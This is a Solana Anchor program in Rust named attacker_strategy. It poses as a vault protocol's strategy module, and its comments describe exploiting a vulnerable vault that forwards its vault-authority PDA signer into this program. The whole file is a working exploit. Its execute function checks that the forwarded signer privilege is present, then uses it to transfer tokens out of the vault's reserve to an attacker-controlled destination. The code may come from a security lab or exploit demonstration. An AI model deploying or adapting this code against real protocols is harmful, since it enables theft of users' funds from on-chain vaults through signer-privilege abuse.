use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer};

declare_id!("BAnD14nexs2Cpb7ZRbvpFCfWZ114641FkwxH5CPxxznZ");

#[program]
pub mod attacker_strategy {
    use super::*;

    /// Implements the protocol's public strategy ABI. The vulnerable vault
    /// forwards its trusted vault-authority PDA as a signer to this program.
    pub fn execute(ctx: Context<Execute>, amount: u64) -> Result<()> {
        require!(amount > 0, AttackerError::InvalidAmount);
        require!(
            ctx.accounts.vault_authority.is_signer,
            AttackerError::MissingForwardedSigner
        );

        token::transfer(
            CpiContext::new(
                ctx.accounts.token_program.to_account_info(),
                Transfer {
                    from: ctx.accounts.reserve.to_account_info(),
                    to: ctx.accounts.destination.to_account_info(),
                    authority: ctx.accounts.vault_authority.to_account_info(),
                },
            ),
            amount,
        )
    }
}

#[derive(Accounts)]
pub struct Execute<'info> {
    #[account(mut)]
    pub reserve: Account<'info, TokenAccount>,
    #[account(mut, constraint = destination.mint == reserve.mint)]
    pub destination: Account<'info, TokenAccount>,
    /// The vulnerable caller marks this PDA as a signer with `invoke_signed`.
    pub vault_authority: Signer<'info>,
    pub token_program: Program<'info, Token>,
}

#[error_code]
pub enum AttackerError {
    #[msg("amount must be positive")]
    InvalidAmount,
    #[msg("vault authority signer privilege was not forwarded")]
    MissingForwardedSigner,
}
